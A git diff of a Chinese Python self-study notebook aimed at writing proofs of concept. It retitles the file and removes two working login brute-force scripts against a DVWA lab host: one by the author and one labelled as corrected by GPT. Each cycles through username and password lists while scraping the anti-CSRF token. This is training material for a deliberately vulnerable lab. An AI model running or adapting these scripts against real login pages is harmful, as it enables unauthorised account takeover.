@@ -1,4 +1,4 @@
-# 屁眼通红自学之路
+# POC编写之Python自学之路
 
 Python 3.12.1 (tags/v3.12.1:2305ca5, Dec  7 2023, 22:03:25) [MSC v.1937 64 bit (AMD64)] on win32
 
@@ -1652,97 +1652,5 @@ f.write('hello world\n')
 
 
 
-## 第一个EXP-DVWA登录爆破
 
-```python
-import sys
-import requests
-import re
-
-url = 'http://10.1.10.1/login.php'
-headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0'
-        }
-# 读取用户名
-with open(r'.\user.txt', 'r') as username_file:
-    usernames = username_file.readlines()
-# 读取密码
-with open(r'.\pass.txt', 'r') as password_file:
-    passwords = password_file.readlines()
-# 对每对用户名和密码尝试登录
-for username in usernames:
-    for password in passwords:
-        session = requests.Session()
-        response1 = session.get(url)
-        user_token = re.search(r'[0-9a-z]{32}', response1.text)
-
-        data = {
-            'username': username.strip(),
-            'password': password.strip(),
-            'Login': 'Login',
-            'user_token': user_token.group()
-        }
-        response2 = session.post(url, data=data, headers=headers)
-
-        if "You have logged in as" in response2.text:
-            print(f"登录成功: 用户名 - {username.strip()} 密码 - {password.strip()}")
-            sys.exit()
-        else:
-            print(f"登录失败: 用户名 - {username.strip()} 密码 - {password.strip()}")
-```
-
-## GPT修正版-DVWA登录爆破
-
-```python
-import sys
-import requests
-import re
-
-url = 'http://10.1.10.1/login.php'
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0'
-}
-
-# 使用Session对象复用同一会话
-session = requests.Session()
-
-try:
-    # 读取用户名
-    with open(r'.\user.txt', 'r') as username_file:
-        usernames = username_file.read().splitlines()
-    # 读取密码
-    with open(r'.\pass.txt', 'r') as password_file:
-        passwords = password_file.read().splitlines()
-
-    # 对每对用户名和密码尝试登录
-    for username in usernames:
-        for password in passwords:
-            response1 = session.get(url, headers=headers)
-            user_token_match = re.search(r'[0-9a-z]{32}', response1.text)
-
-            if user_token_match:
-                user_token = user_token_match.group()
-            else:
-                print('Token未找到，跳过登录尝试。')
-                continue
-
-            data = {
-                'username': username,
-                'password': password,
-                'Login': 'Login',
-                'user_token': user_token
-            }
-            
-            response2 = session.post(url, data=data, headers=headers)
-
-            if "You have logged in as" in response2.text:
-                print(f"登录成功: 用户名 - {username} 密码 - {password}")
-                sys.exit()
-            else:
-                print(f"登录失败: 用户名 - {username} 密码 - {password}")
-except Exception as e:
-    print(f"发生错误: {e}")
-    sys.exit(1)
-
-```
 
